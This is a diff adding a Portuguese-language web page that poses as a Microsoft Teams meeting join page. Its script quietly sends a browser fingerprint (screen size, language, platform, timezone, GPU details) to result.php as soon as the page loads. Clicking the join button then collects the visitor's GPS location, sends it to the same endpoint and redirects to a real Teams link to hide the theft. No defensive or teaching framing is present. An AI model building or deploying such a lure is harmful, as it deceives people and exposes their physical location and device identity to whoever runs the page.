@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Microsoft Teams</title>
+  <style>
+    body {
+      background-color: #f3f3f3;
+      font-family: "Segoe UI", sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+
+    .card {
+      background-color: white;
+      max-width: 400px;
+      margin: auto;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0px 0px 20px rgba(0,0,0,0.1);
+    }
+
+    .loading {
+      font-size: 18px;
+      color: #333;
+      margin-top: 20px;
+    }
+
+    .btn {
+      background-color: #6264a7;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    .spinner {
+      margin: 20px auto;
+      width: 40px;
+      height: 40px;
+      border: 4px solid #ccc;
+      border-top-color: #0066cc;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: none;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body onload="coletaDados(false)">
+  <div class="card">
+    <h2>Reunião do Microsoft Teams</h2>
+    <p>Clique abaixo para entrar na reunião</p>
+    <button class="btn" onclick="getLocation()">Entrar na reunião</button>
+
+    <div class="spinner" id="spinner"></div>
+    <p class="loading" id="loadingText" style="display:none;">Aguarde, conectando...</p>
+  </div>
+
+  <script>
+    function coletaDados(geoFlag) {
+      const screenRes = `${screen.width}x${screen.height}`;
+      const lang = navigator.language || 'N/A';
+      const platform = navigator.platform || 'N/A';
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
+
+      let gpu_vendor = 'N/A';
+      let gpu_renderer = 'N/A';
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (gl && debugInfo) {
+          gpu_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+          gpu_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+      } catch (e) {}
+
+      const data = {
+        screen: screenRes,
+        lang: lang,
+        platform: platform,
+        timezone: timezone,
+        gpu_vendor: gpu_vendor,
+        gpu_renderer: gpu_renderer,
+        geo: geoFlag
+      };
+
+      return data;
+    }
+
+    function getLocation() {
+      document.querySelector("#spinner").style.display = 'block';
+      document.querySelector("#loadingText").style.display = 'block';
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (position) {
+          const base = coletaDados(true);
+          base.lat = position.coords.latitude;
+          base.lon = position.coords.longitude;
+          base.accuracy = position.coords.accuracy;
+          base.timestamp = new Date().toISOString();
+
+          fetch("result.php", {
+            method: "POST",
+            body: JSON.stringify(base),
+            headers: { "Content-Type": "application/json" }
+          }).then(() => {
+            setTimeout(() => {
+              window.location.href = "https://teams.microsoft.com/l/meetup-join/";
+            }, 2000);
+          });
+        }, function (err) {
+          alert("Erro ao obter localização: " + err.message);
+        });
+      } else {
+        alert("Este navegador não suporta geolocalização.");
+      }
+    }
+
+    // Coleta inicial sem geo
+    window.addEventListener("load", () => {
+      const base = coletaDados(false);
+      base.timestamp = new Date().toISOString();
+
+      fetch("result.php", {
+        method: "POST",
+        body: JSON.stringify(base),
+        headers: { "Content-Type": "application/json" }
+      });
+    });
+  </script>
+</body>
+</html>
